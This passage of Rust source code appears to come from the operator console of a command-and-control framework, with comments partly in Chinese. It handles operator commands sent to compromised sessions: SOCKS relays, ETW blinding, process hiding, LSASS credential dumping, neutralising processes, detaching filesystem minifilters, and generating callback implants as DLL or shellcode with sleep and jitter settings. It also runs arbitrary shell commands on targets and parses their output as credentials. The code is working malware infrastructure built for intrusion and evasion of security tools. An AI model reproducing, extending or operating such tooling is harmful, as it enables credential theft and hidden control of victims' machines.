                    let bind_addr = it.next().unwrap_or("127.0.0.1:1080").to_string();
                    let msg = format!("socks listening on {bind_addr}");
                    self.log(&msg, Level::Ok);
                    self.toast(msg, Level::Ok);
                    self.send(Cmd::SocksStart {
                        session: s.id.clone(),
                        bind_addr,
                    });
                    return;
                }
                if first.eq_ignore_ascii_case("stop") {
                    self.log(
                        &format!("[{}] socks relay stopped", short(&s.id)),
                        Level::Info,
                    );
                    self.toast("socks relay stopped", Level::Warn);
                    self.send(Cmd::SocksStop { session: s.id });
                    return;
                }
                // Legacy manual channel control frame.
                let chan: u32 = match first.parse().ok() {
                    Some(c) => c,
                    None => {
                        self.log(
                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let op: u8 = match it.next().and_then(|x| x.parse().ok()) {
                    Some(o) => o,
                    None => {
                        self.log(
                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let addr = match it.next() {
                    Some(a) => a.to_string(),
                    None => {
                        self.log(
                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log(
                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                self.send(Cmd::Socks {
                    session: s.id,
                    chan,
                    op,
                    addr,
                    port,
                });
            }
            "/kill" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Exit {
                    session: s.id.clone(),
                });
                self.log(&format!("[{}] tasked exit", short(&s.id)), Level::Warn);
            }
            "/driver-status" => self.send(Cmd::KernelStatus),
            "/blind-etw" => self.send(Cmd::KernelBlindEtw),
            "/hide" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => {
                        self.log("usage: /hide <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::KernelHide { pid });
            }
            "/dump-lsass" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => {
                        self.log("usage: /dump-lsass <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::KernelDumpLsass { pid });
            }
            "/neutralize" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => {
                        self.log("usage: /neutralize <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::KernelNeutralize { pid });
            }
            "/detach-mf" => self.send(Cmd::KernelDetachMinifilter),
            // ── Implant generation ──────────────────────────────────────
            "/generate" => {
                // /generate <callback> [port] [--sleep N] [--jitter N] [--tls/--no-tls] [--format dll|shellcode]
                let parts = args.split_whitespace().collect::<Vec<_>>();
                if parts.is_empty() {
                    self.log("usage: /generate <callback> [port] [--sleep N] [--jitter N] [--format dll|shellcode]", Level::Warn);
                    return;
                }
                let callback = parts[0].to_string();
                let mut port: u16 = 8443;
                let mut sleep: u32 = 60;
                let mut jitter: u8 = 20;
                let mut tls = true;
                let mut format = "dll".to_string();
                let mut i = 1;
                while i < parts.len() {
                    match parts[i] {
                        "--sleep" => {
                            i += 1;
                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
                                sleep = v;
                            }
                        }
                        "--jitter" => {
                            i += 1;
                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
                                jitter = v;
                            }
                        }
                        "--tls" => tls = true,
                        "--no-tls" => tls = false,
                        "--format" => {
                            i += 1;
                            if let Some(f) = parts.get(i) {
                                format = f.to_string();
                            }
                        }
                        _ => {
                            // Try to parse as port number
                            if let Ok(p) = parts[i].parse::<u16>() {
                                port = p;
                            }
                        }
                    }
                    i += 1;
                }
                self.send(Cmd::GenerateImplant {
                    callback,
                    port,
                    format,
                    uri: "/beacon".into(),
                    sleep,
                    jitter,
                    tls,
                    features: 0,
                });
                self.log("generating implant...", Level::Info);
            }
            "/implants" => self.send(Cmd::FetchImplants),
            "/revoke" => {
                let pk = args.trim().to_string();
                if pk.is_empty() {
                    self.log("usage: /revoke <implant_pub>", Level::Warn);
                    return;
                }
                self.send(Cmd::RevokeImplant { implant_pub: pk });
            }
            other => self.log(
                &format!("! unknown command {other} — try /help",),
                Level::Err,
            ),
        }
    }

    /// Run a shell command whose output we parse into a table overlay.
    /// The command text depends on the beacon's OS guess; we pick POSIX by
    /// default (dev agent runs on macOS/Linux) and Windows if the beacon's os
    /// string mentions "windows".
    fn run_parsed_shell(&mut self, args: &str, label: &str, which: ShellFor) {
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a session first", Level::Err);
            self.toast("! select a session first", Level::Err);
            return;
        };
        let is_windows = s.os.to_ascii_lowercase().contains("windows");
        let (cmd, parse) = match which {
            ShellFor::Ls => {
                let cmd = if is_windows {
                    format!("cmd /c dir {}", args)
                } else {
                    format!("ls -l {}", args)
                };
                (cmd, ParseAs::Files)
            }
            ShellFor::Ps => {
                let cmd = if is_windows {
                    "tasklist /fo csv /nh".to_string()
                } else {
                    "ps aux".to_string()
                };
                (cmd, ParseAs::Procs)
            }
            ShellFor::Creds => {
                // No standard command; operator is expected to have dumped via a
                // BOF. We run the typed args verbatim as a shell command and
                // parse the result.
                (args.to_string(), ParseAs::Creds)
            }
        };
        self.log(
            &format!("[{}] {} $ {}", short(&s.id), label, cmd),
            Level::Info,
        );
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd,
            parse,
        });
    }

    /// 单参数文件操作（cd/mkdir/rm）的参数解析。返回 (op_string, Some((session, path)))。
    fn fileop_one_arg(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String)>) {
        let op = name.trim_start_matches('/').to_string();
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a session first", Level::Err);
            return (op, None);
        };
        let path = match args.split_whitespace().next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <path>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, path)))
    }

    /// 双参数文件操作（mv/cp）的参数解析。返回 (op_string, Some((session, src, dst)))。
    fn fileop_two_args(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String, String)>) {
        let op = name.trim_start_matches('/').to_string();
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a session first", Level::Err);
            return (op, None);
        };
        let mut it = args.split_whitespace();
        let src = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        let dst = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, src, dst)))
    }

    /// 处理 session 元数据命令：/rename /tag /untag /star /note。
    /// id 参数支持前缀匹配（和 /use 一致），找到后改 sessions_meta 并 save。
    fn session_meta_cmd(&mut self, name: &str, args: &str) {
        let mut parts = args.splitn(2, char::is_whitespace);
        let id_prefix = match parts.next() {
            Some(id) if !id.is_empty() => id,
            _ => {
                self.log(&format!("usage: {name} <id-prefix> <value>"), Level::Warn);
                return;
            }
        };
        let value = parts.next().unwrap_or("").trim();
        // 前缀匹配 session id
        let full_id = match self.sess.list.iter().find(|s| s.id.starts_with(id_prefix)) {
            Some(s) => s.id.clone(),
            None => {
                self.log(
                    &format!("! no session matching {id_prefix}"),
                    Level::Err,
                );
                return;
            }
        };
        match name {
            "/rename" => {
                if value.is_empty() {
                    self.log("usage: /rename <id> <name>", Level::Warn);
                    return;
                }
                self.sess.meta.rename(&full_id, value);
                self.persist_meta(&full_id, &format!("renamed → {value}"));
            }
            "/tag" => {
                if value.is_empty() {
                    self.log("usage: /tag <id> <tag>", Level::Warn);
                    return;
                }
                self.sess.meta.tag(&full_id, value);
                self.persist_meta(&full_id, &format!("+tag {value}"));
            }
            "/untag" => {
                if value.is_empty() {
                    self.log("usage: /untag <id> <tag>", Level::Warn);
                    return;
                }
                self.sess.meta.untag(&full_id, value);
                self.persist_meta(&full_id, &format!("-tag {value}"));
            }
            "/star" => {
                self.sess.meta.toggle_star(&full_id);
                let m = self.sess.meta.get(&full_id);
                let msg = if m.favorite {
                    "★ starred"
                } else {
                    "unstarred"
                };
                self.persist_meta(&full_id, msg);
            }
            "/note" => {
                if value.is_empty() {
                    self.log("usage: /note <id> <text>", Level::Warn);
                    return;
                }
                self.sess.meta.note(&full_id, value);
                self.persist_meta(&full_id, "note saved");
            }
            _ => {}
        }
    }

    /// sessions_meta 变更后保存 + 日志确认。
    fn persist_meta(&mut self, id: &str, msg: &str) {
        match self.sess.meta.save() {
            Ok(()) => self.log(&format!("[{}] {msg}", short(id)), Level::Ok),
            Err(e) => self.log(&format!("! save sessions_meta: {e}"), Level::Err),
        }
    }
}

/// 在拓扑图里显示节点的短标签（label 或 id 前 8 字符）。
pub(super) fn short_topo(topo: &topology::Topology, id: &str) -> String {
    topo.nodes
        .iter()
        .find(|n| n.id == id)
        .map(|n| n.label.clone())
        .unwrap_or_else(|| short(id))
}
